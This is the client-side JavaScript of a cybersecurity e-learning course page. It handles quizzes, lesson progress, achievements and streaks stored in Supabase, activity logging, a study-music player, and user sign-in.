          nextQuestionEl.classList.add("active");
          quizState.currentQuestion++;
          updateQuizNavigation();
        }
      }

      function previousQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const prevQuestionEl = currentQuestionEl.previousElementSibling;

        if (
          prevQuestionEl &&
          prevQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          prevQuestionEl.classList.add("active");
          quizState.currentQuestion--;
          updateQuizNavigation();
        }
      }

      function updateQuizNavigation() {
        const totalQuestions =
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
        const prevBtn = document.getElementById("prevQuestionBtn");
        const nextBtn = document.getElementById("nextQuestionBtn");
        const submitBtn = document.getElementById("submitQuizBtn");

        prevBtn.disabled = quizState.currentQuestion === 0;

        const hasAnswer =
          quizState.answers[quizState.currentQuestion] !== undefined;
        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;

        if (isLastQuestion) {
          nextBtn.style.display = "none";
          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
        } else {
          nextBtn.style.display = "inline-flex";
          nextBtn.disabled = !hasAnswer;
          submitBtn.style.display = "none";
        }
      }

      async function submitQuiz() {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const quiz = lesson.quiz;
        let correctAnswers = 0;

        // Hide questions and controls
        document
          .querySelectorAll(".quiz-question")
          .forEach((q) => (q.style.display = "none"));
        document.querySelector(".quiz-controls").style.display = "none";

        // Calculate score and highlight answers
        quiz.questions.forEach((question, index) => {
          const userAnswer = quizState.answers[index];
          const correctAnswer = question.correct;
          const isCorrect = userAnswer === correctAnswer;

          if (isCorrect) correctAnswers++;

          // Highlight answers
          const questionEl = document.querySelector(
            `[data-question="${index}"]`
          );
          const options = questionEl.querySelectorAll(".option");

          options[correctAnswer].classList.add("correct");
          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add("incorrect");
          }
        });

        const score = Math.round(
          (correctAnswers / quiz.questions.length) * 100
        );
        const passed = score >= quiz.passingScore;

        // Update quiz results UI
        const quizScore = document.getElementById("quizScore");
        const quizMessage = document.getElementById("quizMessage");
        const quizActions = document.querySelector(".quiz-actions");

        quizScore.textContent = `${score}%`;
        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;

        if (passed) {
          quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;

          // Mark lesson as completed
          await markLessonComplete(score);
        } else {
          quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
        }

        document.getElementById("quizResults").classList.add("show");

        // Log quiz completion
        logUserActivity("quiz_completed", {
          lesson_id: lesson.id,
          lesson_title: lesson.title,
          score: score,
          passed: passed,
          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
        });

        // Scroll to results
        document
          .getElementById("quizResults")
          .scrollIntoView({ behavior: "smooth" });
      }

      function retakeQuiz() {
        // Reset quiz state
        quizState = {
          currentQuestion: 0,
          answers: [],
          score: 0,
          isComplete: false,
        };

        // Track quiz retry
        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
        courseProgress[lessonId].quizAttempts =
          (courseProgress[lessonId].quizAttempts || 0) + 1;

        // Reload lesson content
        loadLesson(currentLessonIndex);

        // Scroll to quiz
        setTimeout(() => {
          document
            .getElementById("quizSection")
            .scrollIntoView({ behavior: "smooth" });
        }, 500);
      }

      async function markLessonComplete(score) {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonId = lesson.id;

        // Track lesson completion time
        trackLessonTime();

        // Update lesson progress
        courseProgress[lessonId] = {
          ...courseProgress[lessonId],
          completed: true,
          quizScore: score,
          completedAt: new Date().toISOString(),
          finalScore: score,
        };

        // Update session tracking
        courseSession.lessonsCompleted++;

        // Save progress to database
        await saveProgress();

        // Update UI
        renderSidebar();
        updateNavigationButtons();

        // Check various achievements
        await checkLessonCompletionAchievements();
        await checkPerfectScoreAchievements(score);
        await checkStudyTimeAchievements();

        // Log lesson completion
        logUserActivity("lesson_completed", {
          lesson_id: lessonId,
          lesson_title: lesson.title,
          final_score: score,
          time_spent: courseProgress[lessonId].timeSpent || 0,
          lesson_number: currentLessonIndex + 1,
        });

        showToast("Lesson completed successfully!", "success");
      }

      async function completeLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          // Move to next lesson
          currentLessonIndex++;
          loadLesson(currentLessonIndex);
        } else {
          // Course completion
          await completeCourse();
        }
      }

      async function completeCourse() {
        try {
          const completionTime = courseSession.totalStudyTime;

          // Update course progress to 100% completed
          await supabase
            .from("course_progress")
            .update({
              progress: 100,
              completed_at: new Date().toISOString(),
              completion_time_minutes: completionTime,
            })
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Award course completion achievements
          await checkAndUnlockAchievement("course_completion_1");
          await checkSpeedCompletionAchievements(completionTime);
          await checkCourseStreakAchievements();

          // Update user stats
          await updateUserStats();

          // Show completion message
          showToast(
            "Congratulations! Course completed successfully!",
            "certificate"
          );

          // Log course completion
          logUserActivity("course_completed", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore(),
          });

          // Redirect to dashboard after delay
          setTimeout(() => {
            window.location.href = "/dashboard.html";
          }, 3000);
        } catch (error) {
          console.error("Error completing course:", error);
          showToast("Error marking course as complete", "error");
        }
      }

      // =====================================================
      // ACHIEVEMENT INTEGRATION SYSTEM
      // =====================================================
      async function checkAndUnlockAchievement(
        achievementId,
        skipNotification = false
      ) {
        try {
          // Prevent duplicate checks
          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
          if (sessionStorage.getItem(cacheKey)) return false;

          // Check if already unlocked
          const { data: existing, error } = await supabase
            .from("user_achievements")
            .select("id")
            .eq("user_id", currentUser.id)
            .eq("achievement_id", achievementId)
            .single();

          if (existing) {
            sessionStorage.setItem(cacheKey, "true");
            return false;
          }

          // Award achievement
          const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: "course_system",
          };

          const { data, error: insertError } = await supabase
            .from("user_achievements")
            .insert([achievementData])
            .select()
            .single();

          if (insertError) {
            if (insertError.code === "23505") return false; // Already exists
            throw insertError;
          }

          // Update user points
          await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

          // Cache and queue notification
          sessionStorage.setItem(cacheKey, "true");

          if (!skipNotification) {
            queueAchievementNotification({
              id: achievementId,
              name: getAchievementName(achievementId),
              description: getAchievementDescription(achievementId),
              points: achievementData.points_awarded,
              rarity: getAchievementRarity(achievementId),
              icon: getAchievementIcon(achievementId),
            });
          }

          return true;
        } catch (error) {
          console.error("Error unlocking achievement:", error);
          return false;
        }
      }

      // Helper functions for achievement data (replace with your actual achievement definitions)
      function getAchievementPoints(id) {
        const pointsMap = {
          first_course_start: 75,
          first_lesson: 100,
          course_completion_1: 500,
          perfect_score: 250,
          speed_demon: 750,
          marathon_learner: 500,
          night_owl: 200,
          early_bird: 200,
          weekend_warrior: 150,
          // Add more as needed
        };
        return pointsMap[id] || 100;
      }

      function getAchievementName(id) {
        const nameMap = {
          first_course_start: "Learning Initiated",
          first_lesson: "First Steps",
          course_completion_1: "Course Conqueror",
          perfect_score: "Perfectionist",
          speed_demon: "Speed Demon",
          // Add more as needed
        };
        return nameMap[id] || "Achievement Unlocked";
      }

      function getAchievementDescription(id) {
        const descMap = {
          first_course_start: "Start your first cybersecurity course",
          first_lesson: "Complete your first lesson",
          course_completion_1: "Complete your first course",
          perfect_score: "Score 100% on any quiz",
          speed_demon: "Complete a course in under 2 hours",
          // Add more as needed
        };
        return descMap[id] || "Achievement description";
      }

      function getAchievementRarity(id) {
        const rarityMap = {
          first_course_start: "common",
          first_lesson: "bronze",
          course_completion_1: "silver",
          perfect_score: "gold",
          speed_demon: "legendary",
          // Add more as needed
        };
        return rarityMap[id] || "common";
      }

      function getAchievementIcon(id) {
        const iconMap = {
          first_course_start: "fas fa-play",
          first_lesson: "fas fa-baby",
          course_completion_1: "fas fa-trophy",
          perfect_score: "fas fa-star",
          speed_demon: "fas fa-rocket",
          // Add more as needed
        };
        return iconMap[id] || "fas fa-award";
      }

      async function checkLessonAchievements(lessonNumber) {
        if (lessonNumber === 1) {
          await checkAndUnlockAchievement("first_lesson");
        }

        // Check if user has completed multiple lessons in one day
        const today = new Date().toISOString().split("T")[0];
        const todayCompletions = Object.values(courseProgress).filter(
          (p) => p.completed && p.completedAt?.startsWith(today)
        ).length;

        if (todayCompletions >= 3) {
          await checkAndUnlockAchievement("lesson_marathon");
        }
      }

      async function checkLessonCompletionAchievements() {
        const completedCount = getCompletedLessonsCount();

        // Lesson-based achievements
        const lessonMilestones = [1, 5, 10, 25, 50, 100];
        for (const milestone of lessonMilestones) {
          if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
          }
        }

        // Course completion achievements
        if (completedCount === COURSE_DATA.lessons.length) {
          await checkAndUnlockAchievement("course_completion_1");

          // Check for additional course completion achievements
          const { data: allCourses } = await supabase
            .from("course_progress")
            .select("course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100);

          const totalCompleted = allCourses?.length || 0;

          const courseMilestones = [1, 5, 10, 25];
          for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
              await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
          }
        }
      }

      async function checkPerfectScoreAchievements(score) {
        if (score === 100) {
          await checkAndUnlockAchievement("perfect_score");

          // Check for consecutive perfect scores
          const recentScores = Object.values(courseProgress)
            .filter((p) => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map((p) => p.quizScore);

          if (
            recentScores.length >= 3 &&
            recentScores.every((s) => s === 100)
          ) {
            await checkAndUnlockAchievement("perfectionist_streak");
          }
        }
      }

      async function checkSpeedCompletionAchievements(completionTime) {
        // Speed demon: Complete course in under 2 hours (120 minutes)
        if (completionTime <= 120) {
          await checkAndUnlockAchievement("speed_demon");
        }

        // Quick learner: Complete course in under 4 hours (240 minutes)
        if (completionTime <= 240) {
          await checkAndUnlockAchievement("quick_learner");
        }
      }

      async function checkStudyTimeAchievements() {
        const totalTime = courseSession.totalStudyTime;

        // Marathon learner: Study for 8+ hours in a course session
        if (totalTime >= 480) {
          // 8 hours
          await checkAndUnlockAchievement("marathon_learner");
        }

        // Dedicated learner: Study for 4+ hours
        if (totalTime >= 240) {
          // 4 hours
          await checkAndUnlockAchievement("dedicated_learner");
        }
      }

      async function checkCourseStreakAchievements() {
        try {
          // Check for consecutive course completions
          const { data: recentCourses, error } = await supabase
            .from("course_progress")
            .select("completed_at, course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100)
            .order("completed_at", { ascending: false })
            .limit(10);

          if (error || !recentCourses) return;

          // Check for courses completed on consecutive days
          let consecutiveDays = 1;
          for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(
              recentCourses[i - 1].completed_at
            ).toDateString();
            const currentDate = new Date(
              recentCourses[i].completed_at
            ).toDateString();
            const dayDiff =
              Math.abs(new Date(prevDate) - new Date(currentDate)) /
              (1000 * 60 * 60 * 24);

            if (dayDiff <= 1) {
              consecutiveDays++;
            } else {
              break;
            }
          }

          if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement("learning_streak");
          }
        } catch (error) {
          console.error("Error checking course streak achievements:", error);
        }
      }

      // =====================================================
      // TIME-BASED ACHIEVEMENTS
      // =====================================================
      async function checkTimeBasedAchievements(timestamp) {
        const hour = timestamp.getHours();
        const dayOfWeek = timestamp.getDay();

        // Night owl (after midnight, before 6 AM)
        if (hour >= 0 && hour < 6) {
          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
        }

        // Early bird (4 AM to 6 AM)
        if (hour >= 4 && hour < 6) {
          await incrementTimeBasedCounter("early_sessions", "early_bird");
        }

        // Weekend warrior (Saturday = 6, Sunday = 0)
        if (dayOfWeek === 0 || dayOfWeek === 6) {
          await incrementTimeBasedCounter(
            "weekend_sessions",
            "weekend_warrior"
          );
        }
      }

      async function incrementTimeBasedCounter(counterType, achievementId) {
        try {
          const dateStr = new Date().toISOString().split("T")[0];
          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

          // Prevent multiple increments per day
          if (sessionStorage.getItem(cacheKey)) return;

          // Update counter
          await supabase
            .from("profiles")
            .update({
              [counterType]: supabase.sql`${counterType} + 1`,
            })
            .eq("id", currentUser.id);

          // Cache to prevent double counting
          sessionStorage.setItem(cacheKey, "true");

          // Check related achievement
          if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
          }
        } catch (error) {
          console.error(`Error incrementing ${counterType}:`, error);
        }
      }

      async function checkDailyStreak() {
        try {
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("last_activity, current_streak, last_streak_date")
            .eq("id", currentUser.id)
            .single();

          if (error) throw error;

          const now = new Date();
          const today = now.toDateString();
          const lastActivity = profile.last_activity
            ? new Date(profile.last_activity)
            : null;
          const lastStreakDate = profile.last_streak_date
            ? new Date(profile.last_streak_date).toDateString()
            : null;

          let newStreak = profile.current_streak || 0;
          let shouldUpdateStreak = false;

          if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
          } else {
            const daysSinceLastActivity = Math.floor(
              (now - lastActivity) / (1000 * 60 * 60 * 24)
            );

            if (lastStreakDate === today) {
              // Already counted today's streak
              return newStreak;
            } else if (
              daysSinceLastActivity === 1 ||
              (daysSinceLastActivity === 0 && lastStreakDate !== today)
            ) {
              // Consecutive day or same day but not counted yet
              newStreak += 1;
              shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
              // Streak broken
              newStreak = 1;
              shouldUpdateStreak = true;
            }
          }

          if (shouldUpdateStreak) {
            await supabase
              .from("profiles")
              .update({
                current_streak: newStreak,
                last_activity: now.toISOString(),
                last_streak_date: now.toISOString(),
              })
              .eq("id", currentUser.id);

            userStats.current_streak = newStreak;

            showToast(`Daily streak: ${newStreak} days!`, "success");
            await checkStreakAchievements(newStreak);
          }

          return newStreak;
        } catch (error) {
          console.error("Error checking daily streak:", error);
          return 0;
        }
      }

      async function checkStreakAchievements(currentStreak) {
        const streakMilestones = [3, 7, 14, 30, 100, 365];

        for (const milestone of streakMilestones) {
          if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
          }
        }
      }

      // =====================================================
      // USER ACTIVITY LOGGING
      // =====================================================
      async function logUserActivity(activityType, metadata = {}) {
        try {
          const now = new Date();

          const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString(),
          };

          // Try to log to activities table
          const { error } = await supabase
            .from("user_activities")
            .insert([activityData]);

          if (error && error.code !== "42P01") {
            console.warn("Activity logging failed:", error.message);
          }

          // Always update last activity in profile
          await supabase
            .from("profiles")
            .update({ last_activity: now.toISOString() })
            .eq("id", currentUser.id);
        } catch (error) {
          console.error("Error logging user activity:", error);
        }
      }

      // =====================================================
      // NAVIGATION SYSTEM
      // =====================================================
      function updateNavigationButtons() {
        const prevBtn = document.getElementById("prevLessonBtn");
        const nextBtn = document.getElementById("nextLessonBtn");

        if (!prevBtn || !nextBtn) return;

        // Previous button
        prevBtn.disabled = currentLessonIndex === 0;

        // Next button logic
        const isLastLesson =
          currentLessonIndex === COURSE_DATA.lessons.length - 1;
        const canGoNext =
          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
          canAccessLesson(currentLessonIndex + 1);

        if (isLastLesson) {
          const isCurrentCompleted =
            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
              ?.completed;
          nextBtn.disabled = !isCurrentCompleted;
          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
        } else {
          nextBtn.disabled = !canGoNext;
          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
        }
      }

      // Navigation button event handlers
      function goToPreviousLesson() {
        if (currentLessonIndex > 0) {
          trackLessonTime(); // Track time spent on current lesson
          currentLessonIndex--;
          loadLesson(currentLessonIndex);
        }
      }

      function goToNextLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          const canGoNext = canAccessLesson(currentLessonIndex + 1);
          if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
          } else {
            showToast("Complete the current lesson quiz to proceed", "warning");
          }
        } else {
          // Complete course
          completeCourse();
        }
      }

      // =====================================================
      // SIDEBAR FUNCTIONS
      // =====================================================
      function toggleSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.toggle("open");
        if (overlay) overlay.classList.toggle("active");
      }

      function closeSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.remove("open");
        if (overlay) overlay.classList.remove("active");
      }

      // =====================================================
      // ACHIEVEMENT NOTIFICATION SYSTEM
      // =====================================================
      function queueAchievementNotification(achievement) {
        notificationQueue.push(achievement);
        processNotificationQueue();
      }

      function processNotificationQueue() {
        if (isShowingNotification || notificationQueue.length === 0) return;

        isShowingNotification = true;
        const achievement = notificationQueue.shift();
        showAchievementNotification(achievement);

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          isShowingNotification = false;
          processNotificationQueue();
        }, duration + 500);
      }

      function showAchievementNotification(achievement) {
        const notification = document.getElementById("achievementNotification");
        if (!notification) return;

        const icon = document.getElementById("notificationIcon");
        const title = document.getElementById("notificationTitle");
        const description = document.getElementById("notificationDescription");
        const points = document.getElementById("notificationPoints");

        if (icon) {
          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
          icon.className = `notification-icon ${achievement.rarity}`;
        }
        if (title) title.textContent = achievement.name;
        if (description) description.textContent = achievement.description;
        if (points) points.textContent = `+${achievement.points} Points`;

        notification.className = `achievement-notification ${achievement.rarity}`;
        notification.classList.add("show");

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          notification.classList.remove("show");
        }, duration);
      }

      // =====================================================
      // UTILITY FUNCTIONS
      // =====================================================
      function calculateAverageQuizScore() {
        const scores = Object.values(courseProgress)
          .filter((p) => p.completed && p.quizScore)
          .map((p) => p.quizScore);

        if (scores.length === 0) return 0;
        return Math.round(
          scores.reduce((sum, score) => sum + score, 0) / scores.length
        );
      }

      async function resetProgress() {
        if (
          !confirm(
            "Are you sure you want to reset your progress? This action cannot be undone."
          )
        ) {
          return;
        }

        try {
          // Track lesson time before reset
          trackLessonTime();

          // Reset local state
          courseProgress = {};
          currentLessonIndex = 0;
          courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date(),
          };

          // Delete from database
          await supabase
            .from("course_progress")
            .delete()
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Log reset activity
          logUserActivity("progress_reset", {
            course_id: COURSE_DATA.id,
            reset_reason: "manual",
          });

          // Reinitialize
          await saveProgress();
          renderSidebar();
          loadLesson(0);

          showToast("Progress reset successfully", "success");
        } catch (error) {
          console.error("Error resetting progress:", error);
          showToast("Failed to reset progress", "error");
        }
      }

      function copyCode(codeId) {
        const codeElement = document.getElementById(codeId);
        if (!codeElement) return;

        const text = codeElement.textContent;

        navigator.clipboard
          .writeText(text)
          .then(() => {
            showToast("Code copied to clipboard!", "success");

            // Track code copy for achievements
            logUserActivity("code_copied", {
              code_section: codeId,
              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
            });
          })
          .catch((err) => {
            console.error("Failed to copy code:", err);
            showToast("Failed to copy code", "error");

            // Fallback for older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
              document.execCommand("copy");
              showToast("Code copied to clipboard!", "success");
            } catch (fallbackError) {
              showToast(
                "Copy failed - please select and copy manually",
                "error"
              );
            }
            document.body.removeChild(textArea);
          });
      }

      function escapeHtml(text) {
        const div = document.createElement("div");
        div.textContent = text;
        return div.innerHTML;
      }

      // =====================================================
      // UI FEEDBACK SYSTEMS
      // =====================================================
      function showToast(message, type = "success") {
        const toast = document.getElementById("toast");
        const messageEl = document.getElementById("toastMessage");

        if (!toast || !messageEl) {
          console.log(`Toast: ${message} (${type})`);
          return;
        }

        messageEl.textContent = message;
        toast.className = `toast ${type} show`;

        setTimeout(() => {
          toast.classList.remove("show");
        }, 4000);
      }

      function showLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) loadingScreen.classList.remove("hidden");
      }

      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          setTimeout(() => {
            loadingScreen.classList.add("hidden");
          }, 1000);
        }
      }

      // =====================================================
      // MUSIC PLAYER INTEGRATION
      // =====================================================
      function initMusicPlayer() {
        const btnText = document.getElementById("music-button-text");
        const icon = document.getElementById("music-icon");
        const dropdown = document.getElementById("music-dropdown-content");

        if (!btnText || !icon || !dropdown) return;

        function setUI(state) {
          btnText.textContent =
            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
          icon.className =
            state === "Playing"
              ? "fa-solid fa-circle-pause"
              : "fa-solid fa-music";
        }

        // Load saved music state
        const savedSrc = localStorage.getItem("cybersec_music_src");
        const savedTime = parseFloat(
          localStorage.getItem("cybersec_music_time") || 0
        );

        if (savedSrc) {
          audioPlayer.src = savedSrc;
          audioPlayer.currentTime = savedTime;
          audioPlayer
            .play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
        }

        // Music button click handler
        document
          .getElementById("music-dropdown")
          .querySelector("button")
          .addEventListener("click", (e) => {
            e.stopPropagation();
            dropdown.style.display =
              dropdown.style.display === "block" ? "none" : "block";

            if (audioPlayer.src && !audioPlayer.paused) {
              audioPlayer.pause();
              setUI("Stopped");
            } else if (audioPlayer.src) {
              audioPlayer.play().then(() => setUI("Playing"));
            }
          });

        // Music selection handlers
        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
          link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
          });
        });

        // Stop music handler
        const stopLink = document.getElementById("stop-music-link");
        if (stopLink) {
          stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
          });
        }

        // Save music state before page unload
        window.addEventListener("beforeunload", () => {
          if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
              "cybersec_music_time",
              audioPlayer.currentTime
            );
          }
        });

        // Close dropdown when clicking outside
        window.addEventListener("click", (e) => {
          if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
          }
        });
      }

      // Show initial music indicator
      function addMusicIndicator() {
        const musicBtn = document.querySelector("#music-dropdown");
        if (musicBtn) {
          const indicator = document.createElement("div");
          indicator.className = "music-indicator";
          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

          musicBtn.style.position = "relative";
          musicBtn.appendChild(indicator);

          setTimeout(() => indicator.remove(), 3000);
        }
      }

      // Initialize Event Listeners
      function initializeEventListeners() {
        // Navigation buttons
        document
          .getElementById("prevLessonBtn")
          ?.addEventListener("click", goToPreviousLesson);
        document
          .getElementById("nextLessonBtn")
          ?.addEventListener("click", goToNextLesson);

        // Reset progress button
        document
          .getElementById("resetProgressBtn")
          ?.addEventListener("click", resetProgress);

        // Mobile menu toggle
        document
          .getElementById("menuToggle")
          ?.addEventListener("click", toggleSidebar);
        document
          .getElementById("sidebarOverlay")
          ?.addEventListener("click", closeSidebar);

        // Keyboard shortcuts
        document.addEventListener("keydown", handleKeyboardShortcuts);

        // Window resize handler
        window.addEventListener("resize", handleWindowResize);

        // Content interaction tracking
        document.getElementById("contentBody")?.addEventListener(
          "scroll",
          debounce(() => {
            trackUserInteraction();
          }, 1000)
        );
      }

      // Keyboard Shortcuts
      function handleKeyboardShortcuts(e) {
        if (document.querySelector(".quiz-question.active")) return;

        if (e.key === "ArrowLeft" && e.ctrlKey) {
          e.preventDefault();
          goToPreviousLesson();
        } else if (e.key === "ArrowRight" && e.ctrlKey) {
          e.preventDefault();
          goToNextLesson();
        }
      }

      // Window Resize Handler
      function handleWindowResize() {
        if (window.innerWidth > 768) {
          closeSidebar();
        }
      }

      // Debounce Helper
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }

      // Initialize responsive behavior
      if (window.innerWidth <= 768) {
        document.getElementById("menuToggle").style.display = "inline-flex";
      }

      // Auto-save progress periodically
      setInterval(async () => {
        if (currentUser && Object.keys(courseProgress).length > 0) {
          await saveProgress();
        }
      }, 60000); // Save every minute

      // System initialization logging
      console.log("CyberSec Academy Course System Initialized");
      console.log("Current Course:", COURSE_DATA.title);
      console.log("Total Lessons:", COURSE_DATA.lessons.length);

      // Google OAuth Integration
      const googleBtn = document.querySelector(".btn-google");
      if (googleBtn) {
        googleBtn.addEventListener("click", async () => {
          const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
              redirectTo:
                window.location.origin +
                "/courses/sql-injection-attacks.html",
            },
          });

          if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
          }
        });
      }

      // Check for existing session
      supabase.auth.getSession().then(({ data }) => {
        if (data.session) {
          console.log("User already logged in:", data.session.user);
          currentUser = data.session.user;
          startCourseSession();
        }
      });

      // Add missing auth modal functions
      function openAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "flex";
        }
      }

      function closeAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "none";
        }
      }

      // Add auth tab switching functionality
      document.getElementById("tabSignIn")?.addEventListener("click", () => {
        document.getElementById("tabSignIn").classList.add("active");
        document.getElementById("tabSignUp").classList.remove("active");
        document.getElementById("signInForm").style.display = "block";
        document.getElementById("signUpForm").style.display = "none";
      });

      document.getElementById("tabSignUp")?.addEventListener("click", () => {
        document.getElementById("tabSignUp").classList.add("active");
        document.getElementById("tabSignIn").classList.remove("active");
        document.getElementById("signUpForm").style.display = "block";
        document.getElementById("signInForm").style.display = "none";
      });

      document
        .getElementById("closeAuthModal")
        ?.addEventListener("click", closeAuthModal);

      // Improved error handling for auth session
      supabase.auth.onAuthStateChange((event, session) => {
        if (event === "SIGNED_IN") {
          currentUser = session.user;
          closeAuthModal();
          startCourseSession();
        } else if (event === "SIGNED_OUT") {
          currentUser = null;
          openAuthModal();
        }
      });

      // Add form submission handlers
      document
        .getElementById("emailSignInForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signInEmail").value;
          const password = document.getElementById("signInPassword").value;

          try {
            const { data, error } = await supabase.auth.signInWithPassword({
              email,
              password,
            });

            if (error) throw error;

            closeAuthModal();
          } catch (error) {
            showToast(error.message, "error");
          }
        });

      document
        .getElementById("emailSignUpForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signUpEmail").value;
          const password = document.getElementById("signUpPassword").value;
          const name = document.getElementById("signUpName").value;

          try {
            const { data, error } = await supabase.auth.signUp({
              email,
              password,
              options: {
                data: {
                  full_name: name,
                },
              },
            });

            if (error) throw error;

            showToast(
              "Account created successfully! Please check your email.",
              "success"
            );
          } catch (error) {
            showToast(error.message, "error");
          }
        });
    </script>
  </body>
</html>
